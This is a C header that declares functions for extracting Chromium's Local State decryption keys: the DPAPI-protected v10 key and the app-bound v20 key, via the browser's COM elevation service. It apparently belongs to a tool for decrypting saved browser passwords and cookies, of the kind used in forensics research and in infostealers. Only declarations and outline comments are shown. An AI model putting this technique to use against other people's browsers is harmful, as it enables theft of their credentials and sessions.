#pragma once
#ifndef KEY_EXTRACT_H
#define KEY_EXTRACT_H

// Extraction of the Chromium Local State decryption keys.
// Both functions return a heap buffer in *ppbKey (free with HeapFree);
// no global state is used.

#include "BrowserDefs.h"

// "os_crypt.encrypted_key" -> base64 -> "DPAPI"-prefixed blob -> CryptUnprotectData.
BOOL ExtractDecryptedV10KeyFromLocalState(IN BROWSER_TYPE Browser, OUT PBYTE* ppbKey, OUT PDWORD pcbKey);

// "os_crypt.app_bound_encrypted_key" -> base64 -> "APPB"-prefixed blob -> COM elevation service DecryptData (32 byte AES key).
BOOL ExtractDecryptedV20KeyFromLocalState(IN BROWSER_TYPE Browser, OUT PBYTE* ppbKey, OUT PDWORD pcbKey);

#endif // !KEY_EXTRACT_H
